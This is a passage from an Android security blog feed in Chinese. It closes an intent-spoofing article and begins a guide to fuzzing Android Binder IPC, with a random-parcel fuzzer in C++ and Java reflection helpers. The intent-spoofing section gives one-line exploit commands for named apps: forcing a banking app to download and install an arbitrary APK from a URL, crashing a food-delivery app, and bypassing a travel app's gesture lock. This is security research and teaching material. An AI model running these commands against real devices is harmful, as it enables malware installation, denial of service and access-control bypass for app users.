(ContentResolver.ACTION_SYNC_CONN_STATUS_CHANGED.equals(action)) &#123;<br>        sSyncState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (intent.hasCategory(Intent.CATEGORY_ALTERNATIVE)) &#123;<br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> intent.getData();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">buttonId</span> <span class="hljs-operator">=</span> Integer.parseInt(data.getSchemeSpecificPart());<br>        <span class="hljs-keyword">if</span> (buttonId == BUTTON_WIFI) &#123;<br>            sWifiState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_BRIGHTNESS) &#123;<br>            toggleBrightness(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_SYNC) &#123;<br>            sSyncState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_LOCATION) &#123;<br>            sLocationState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_BLUETOOTH) &#123;<br>            sBluetoothState.toggleState(context);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Don&#x27;t fall-through to updating the widget.  The Intent</span><br>        <span class="hljs-comment">// was something unrelated or that our super class took</span><br>        <span class="hljs-comment">// care of.</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// State changes fall through</span><br>    updateWidget(context);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现无法对广播的发送者进行校验，收到广播就执行相关的动作。</p><h4 id="江苏银行手机银行下载安装任意apk（可木马）"><a href="#江苏银行手机银行下载安装任意apk（可木马）" class="headerlink" title="江苏银行手机银行下载安装任意apk（可木马）"></a>江苏银行手机银行下载安装任意apk（可木马）</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0104992">http://www.wooyun.org/bugs/wooyun-2010-0104992</a></p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.UpdateService&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;cn.jsb.china.UpdateService&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br></code></pre></td></tr></table></figure><p>UpdateService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent arg6, <span class="hljs-type">int</span> arg7, <span class="hljs-type">int</span> arg8)</span> &#123;<br><br>    <span class="hljs-type">Bundle</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> arg6.getExtras();<br><br>    <span class="hljs-keyword">if</span>(v0 != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.a = v0.getBoolean(<span class="hljs-string">&quot;isupdate&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.b = arg6.getStringExtra(<span class="hljs-string">&quot;url&quot;</span>);<br>    <span class="hljs-built_in">this</span>.c = <span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;notification&quot;</span>);<br>    <span class="hljs-built_in">this</span>.d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notification</span>();<br>    <span class="hljs-built_in">this</span>.d.icon = <span class="hljs-number">17301633</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.a) &#123;<br>        <span class="hljs-built_in">this</span>.i = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteViews</span>(<span class="hljs-built_in">this</span>.getPackageName(), <span class="hljs-number">2130903048</span>);<br>        <span class="hljs-built_in">this</span>.d.tickerText = <span class="hljs-string">&quot;正在下载江苏银行&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.i = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteViews</span>(<span class="hljs-built_in">this</span>.getPackageName(), <span class="hljs-number">2130903043</span>);<br>        <span class="hljs-built_in">this</span>.d.tickerText = <span class="hljs-string">&quot;正在下载手机证券&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.d.when = System.currentTimeMillis();<br>    <span class="hljs-built_in">this</span>.d.flags |= <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">this</span>.d.flags |= <span class="hljs-number">32</span>;<br>    <span class="hljs-built_in">this</span>.d.defaults = <span class="hljs-number">4</span>;<br>    <span class="hljs-built_in">this</span>.d.contentView = <span class="hljs-built_in">this</span>.i;<br>    <span class="hljs-built_in">this</span>.d.setLatestEventInfo(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, PendingIntent.getActivity(((Context)<span class="hljs-built_in">this</span>), <br>            <span class="hljs-number">0</span>, arg6, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-built_in">this</span>.c.notify(<span class="hljs-built_in">this</span>.j, <span class="hljs-built_in">this</span>.d);<br>    <span class="hljs-built_in">this</span>.g = <span class="hljs-keyword">new</span> <span class="hljs-title class_">jn</span>(<span class="hljs-built_in">this</span>, Looper.myLooper(), ((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-built_in">this</span>.g.sendMessage(<span class="hljs-built_in">this</span>.g.obtainMessage(<span class="hljs-number">3</span>, Integer.valueOf(<span class="hljs-number">0</span>)));<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">jm</span>(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.b).start();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.onStartCommand(arg6, arg7, arg8);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>利用代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">am startservice -n cn.jsb.china/.UpdateService --ez isupdate <span class="hljs-literal">true</span> --es url http://192.168.102.204/mijian_2.5.1_272.apk<br></code></pre></td></tr></table></figure><h4 id="美团外卖客户端本地拒绝服务漏洞"><a href="#美团外卖客户端本地拒绝服务漏洞" class="headerlink" title="美团外卖客户端本地拒绝服务漏洞"></a>美团外卖客户端本地拒绝服务漏洞</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0106580">http://www.wooyun.org/bugs/wooyun-2010-0106580</a></p><p>利用代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell am startservice -n com.sankuai.meituan.takeoutnew/com.sankuai.mtmp.service.MtmpService<br></code></pre></td></tr></table></figure><h4 id="航旅纵横手势锁轻易绕过及其它漏洞"><a href="#航旅纵横手势锁轻易绕过及其它漏洞" class="headerlink" title="航旅纵横手势锁轻易绕过及其它漏洞"></a>航旅纵横手势锁轻易绕过及其它漏洞</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0111692">http://www.wooyun.org/bugs/wooyun-2010-0111692</a></p><p>利用代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">am start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>[1] <a href="https://appvigil.co/blog/intent-spoofing-vulnerability-in-android-apps/">Intent Spoofing Vulnerability in Android Apps – OWASP Top 10</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Binder Fuzzing 的一些思路</title>
    <link href="/cn/Android_binder_fuzzing/"/>
    <url>/cn/Android_binder_fuzzing/</url>
    
    <content type="html"><![CDATA[<h2 id="1-binder-简介"><a href="#1-binder-简介" class="headerlink" title="1. binder 简介"></a>1. binder 简介</h2><p>Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。<br>在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用<br>Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalvik 虚拟机使用应用程序的用户 ID 运行在自己的进程中。<br>这些关键的机制在操作系统层面上强制数据安全，因为应用程序之间不共享内存、访问权限及磁盘存储。应用程序只能在它们自己的 Dalvik 虚拟机范围内访问内存和数据。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ps<br>...<br><br>u0_a16        2757   882 2574956 116944 SyS_epoll+          0 S com.google.android.gms.persistent<br>u0_a128       2774   883 1939084  87720 SyS_epoll+          0 S com.ss.android.article.news:push<br>u0_a16        2850   882 2322980  46592 SyS_epoll+          0 S com.google.process.gapps<br>u0_a128       2887   883 2190568 181868 SyS_epoll+          0 S com.ss.android.article.news<br>u0_a37        2900   882 2430908  58316 SyS_epoll+          0 S com.google.android.googlequicksearchbox:interactor<br>nfc           2918   882 2351828  62356 SyS_epoll+          0 S com.android.nfc<br>u0_a45        2930   882 2309884  43576 SyS_epoll+          0 S se.dirac.acs<br>radio         2945   882 2313144  45592 SyS_epoll+          0 S net.oneplus.push<br>u0_a0         2956   882 2304600  36360 SyS_epoll+          0 S com.oneplus<br>system        2967   882 2307276  38088 SyS_epoll+          0 S com.fingerprints.serviceext<br>system        2985   882 2309992  42044 SyS_epoll+          0 S com.oneplus.opbugreportlite<br>u0_a142       2997   882 2370296  93324 SyS_epoll+          0 S com.oneplus.aod<br>u0_a16        3018   882 2731976 165828 SyS_epoll+          0 S com.google.android.gms<br>...<br></code></pre></td></tr></table></figure><p>Android app 是由 Activity、Service、Broadcast 和 Content Provider 四大组件构成，而这些组件可能运行在同一进程中，也可能运行在不同的<br>进程中，而像 PowerManagerService等重要服务都运行在核心进程 <code>system_server</code> 里，所以 Android 系统必须实现一个靠谱的进程间通信机制 （IPC）。<br>Android系统基于 Linux 开发，Linux 中有很多进程间通信的方法，如 Signal、Pipe、Socket、Share Memeory、Semaphore， 但是 Android 系统并没有使用<br>这些进程间通信的方法，而是基于 OpenBinder 自己开发了一套进程通信的方法，Binder 是 Android 系统 IPC 通信的机制。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ adb shell ps | grep system_server<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>63 32 120160 35408 ffffffff afd0c738 S system_server<br><br>$ adb logcat | grep <span class="hljs-string">&quot;63)&quot;</span><br><span class="hljs-built_in">..</span>.<br>D/PowerManagerService( 63): bootCompleted<br>I/TelephonyRegistry( 63): notifyServiceState: 0 home Android Android 310260 UMTS CSS <span class="hljs-keyword">not</span> supp<span class="hljs-built_in">..</span>.<br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=0 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">false</span> <span class="hljs-attribute">reason</span>=<span class="hljs-literal">null</span><br><span class="hljs-attribute">interfaceName</span>=<span class="hljs-literal">null</span> <span class="hljs-attribute">networkType</span>=3<br>I/SearchManagerService( 63): Building list of searchable activities<br>I/WifiService( 63): WifiService trying <span class="hljs-keyword">to</span> setNumAllowed <span class="hljs-keyword">to</span> 11 with persist <span class="hljs-built_in">set</span> <span class="hljs-keyword">to</span> <span class="hljs-literal">true</span><br>I/ActivityManager( 63):<span class="hljs-built_in"> Config </span>changed: &#123; <span class="hljs-attribute">scale</span>=1.0 <span class="hljs-attribute">imsi</span>=310/260 <span class="hljs-attribute">loc</span>=en_US <span class="hljs-attribute">touch</span>=3 <span class="hljs-attribute">keys</span>=2/1/2 <span class="hljs-attribute">nav</span>=3/1 <span class="hljs-built_in">..</span>.<br>I/TelephonyRegistry( 63): notifyMessageWaitingChanged: <span class="hljs-literal">false</span><br>I/TelephonyRegistry( 63): notifyCallForwardingChanged: <span class="hljs-literal">false</span><br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=1 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">reason</span>=simL...<br>I/TelephonyRegistry( 63): notifyDataConnection: <span class="hljs-attribute">state</span>=2 <span class="hljs-attribute">isDataConnectivityPossible</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">reason</span>=simL...<br>D/Tethering( 63): MasterInitialState.processMessage <span class="hljs-attribute">what</span>=3<br>I/ActivityManager( 63): Start proc android.process.media <span class="hljs-keyword">for</span> broadcast<br>com.android.providers.downloads/.DownloadReceiver: <span class="hljs-attribute">pid</span>=223 <span class="hljs-attribute">uid</span>=10002 gids=&#123;1015, 2001, 3003&#125;<br>I/RecoverySystem( 63): <span class="hljs-literal">No</span> recovery log file<br>W/WindowManager( 63): App freeze timeout expired.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226160614691_1337421380.png" alt="binder"></p><h2 id="2-Binder-架构"><a href="#2-Binder-架构" class="headerlink" title="2. Binder 架构"></a>2. Binder 架构</h2><p>Binder 使用 CS （Client&#x2F;Server） 模型，提供服务的进程是 Server 进程，访问服务的是 Client 进程。从代码实现的角度看，Binder架构采用的是分层架构设计,<br>大致上可以分为 Java 层， Java IPC 层，Native IPC 层， Linux 内核层。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224151909041_1890401128.png" alt="1"></p><p>从组件的视角来看，Binder 包含了 Client、Server、ServiceManger 和 binder 驱动， ServiceManager 用于管理系统中的各种服务，见下图。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181224155625665_1820827979.gif" alt="2"></p><p>图中虚线的箭头为跨进程的进程间通信，必须使用 Android IPC binder 机制。</p><h2 id="3-为什么要-fuzz-binder"><a href="#3-为什么要-fuzz-binder" class="headerlink" title="3. 为什么要 fuzz binder"></a>3. 为什么要 fuzz binder</h2><p>把 Binder 作为一个目标的原因比较明显的，因为在 Android 的安全模型中，Binder 是一个重要的安全边界。在一个低权限<br>的 app 里面构造的数据，会在高权限的进程里面使用，如果发生问题，就是一个明显的权限提升漏洞。另外数据在处理的过程中，<br>有 flatten 和 unflatten 两个步骤，这些步骤就像我们平时说的编码和解码一样非常容易出问题。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225102933309_922476451.png" alt="weakness"></p><p>存在一些非常经典的漏洞， 例如 CVE-2014-7911 该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。</p><h2 id="4-实现"><a href="#4-实现" class="headerlink" title="4. 实现"></a>4. 实现</h2><p>在每个层面都可以实现相关代码进行 Fuzz， 下面分析在每个层面的具体实现。</p><h3 id="4-1-直接调用-ioctl"><a href="#4-1-直接调用-ioctl" class="headerlink" title="4.1  直接调用 ioctl"></a>4.1  直接调用 ioctl</h3><p>实现 Binder fuzzer 的方法有好几种，最直接的想法当然就是直接调用 ioctl 系统调用。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181225101500954_2019536930.png" alt="ioctl"></p><p>其中 fd 可以通过打开 &#x2F;dev&#x2F;binder 设备文件获得，难点在 <code>binder_write_read</code> 数据结构的构造。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/binder&quot;</span>, O_RDWR);<br></code></pre></td></tr></table></figure><h3 id="4-2-Native-层"><a href="#4-2-Native-层" class="headerlink" title="4.2 Native 层"></a>4.2 Native 层</h3><p>在 Native 层，利用 IBinder 可以将问题简化， 看上面的结构图，通过阅读 Android 源码， 可以看出我们可以利用 IBinder<br>的 transcat 来调用相应的Binder 接口函数，参考：</p><p><a href="https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp">https://android.googlesource.com/platform/frameworks/native/+/master/cmds/service/service.cpp</a></p><p>调用 IBinder 的 transact 需要自己填充 parcel 数据， 可以从下面的示意理解大致的含义：</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20181226153937869_763457039.png" alt="5"></p><p>code 为 Binder 调用接口的功能号， parcel 中需要指定调用那个接口。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">String16 <span class="hljs-title">get_interface_name</span><span class="hljs-params">(sp&lt;IBinder&gt; service)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (service != <span class="hljs-literal">NULL</span>) &#123;<br>        Parcel data, reply;<br>        <span class="hljs-type">status_t</span> err = service-&gt;<span class="hljs-built_in">transact</span>(IBinder::INTERFACE_TRANSACTION, data, &amp;reply);<br>        <span class="hljs-keyword">if</span> (err == NO_ERROR) &#123;<br>            <span class="hljs-keyword">return</span> reply.<span class="hljs-built_in">readString16</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String16</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>.</span><br><span class="hljs-function"></span>&#123;<br>    sp&lt;IServiceManager&gt; sm = <span class="hljs-built_in">defaultServiceManager</span>();<br>    Vector&lt;String16&gt; services = sm-&gt;<span class="hljs-built_in">listServices</span>();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; services.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        String16 name = services[i];<br>        sp&lt;IBinder&gt; service = sm-&gt;<span class="hljs-built_in">checkService</span>(name);<br>        String16 ifName = <span class="hljs-built_in">get_interface_name</span>(service);<br>        <span class="hljs-keyword">if</span> (service != <span class="hljs-literal">NULL</span> &amp;&amp; ifName.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> code = <span class="hljs-number">0</span>; code &lt;= <span class="hljs-number">100</span>; code++) &#123;<br>                aout &lt;&lt; <span class="hljs-string">&quot;ifName: &quot;</span> &lt;&lt; ifName &lt;&lt; <span class="hljs-string">&quot;, code: &quot;</span> &lt;&lt; code &lt;&lt; endl;<br><br>                Parcel data, reply;<br>                data.<span class="hljs-built_in">writeInterfaceToken</span>(ifName);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">random</span>() % <span class="hljs-number">800</span>; i++ ) &#123;<br>                    <span class="hljs-type">uint32_t</span> a = <span class="hljs-built_in">random</span>();<br>                    aout &lt;&lt; <span class="hljs-string">&quot;data[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]: &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>                    data.<span class="hljs-built_in">writeInt32</span>(a);<br>                &#125;<br>                service-&gt;<span class="hljs-built_in">transact</span>(code, data, &amp;reply, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-3-Java-应用层"><a href="#4-3-Java-应用层" class="headerlink" title="4.3 Java 应用层"></a>4.3 Java 应用层</h3><p>到了 Java 应用层，我们可以获得的信息就丰富了，可以获得详细的信息。</p><h4 id="1-获取所有运行的services"><a href="#1-获取所有运行的services" class="headerlink" title="1) 获取所有运行的services"></a>1) 获取所有运行的services</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String[] getServices() &#123;<br>    String[] services = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        services = (String[]) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;listServices&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> services;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-获得对应服务的IBinder-对象"><a href="#2-获得对应服务的IBinder-对象" class="headerlink" title="2) 获得对应服务的IBinder 对象"></a>2) 获得对应服务的IBinder 对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-利用反射获取对应接口的所有code"><a href="#3-利用反射获取对应接口的所有code" class="headerlink" title="3) 利用反射获取对应接口的所有code"></a>3) 利用反射获取对应接口的所有code</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> HashMap&lt;String,Integer&gt; <span class="hljs-title function_">getBinderCode</span><span class="hljs-params">(String interfaceDescriptor)</span> &#123;<br>    HashMap&lt;String, Integer&gt; codes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">if</span> (interfaceDescriptor == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> codes;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Class&lt;?&gt; cStub = Class<br>                .forName(interfaceDescriptor + <span class="hljs-string">&quot;$Stub&quot;</span>);<br>        Field[] f = cStub.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (Field field : f) &#123;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            String k= field.toString().split(<span class="hljs-string">&quot;\\$Stub\\.&quot;</span>)[<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (k.contains(<span class="hljs-string">&quot;TRANSACTION&quot;</span>))<br>                codes.put(k, (<span class="hljs-type">int</span>)field.get(<span class="hljs-built_in">this</span>));<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> codes;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-利用反射获取对应接口所有调用的参数类型"><a href="#4-利用反射获取对应接口所有调用的参数类型" class="headerlink" title="4) 利用反射获取对应接口所有调用的参数类型"></a>4) 利用反射获取对应接口所有调用的参数类型</h4><p>binder call 的参数类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> HashMap&lt;String, List&lt;String&gt;&gt;<br>    <span class="hljs-title function_">getBinderCallParameter</span><span class="hljs-params">(String interfaceDescriptor,</span><br><span class="hljs-params">                           HashMap&lt;String, Integer&gt; codes)</span> &#123;<br>    HashMap&lt;String, List&lt;String&gt;&gt; ret = <span class="hljs-keyword">new</span> <span class="hljs-title 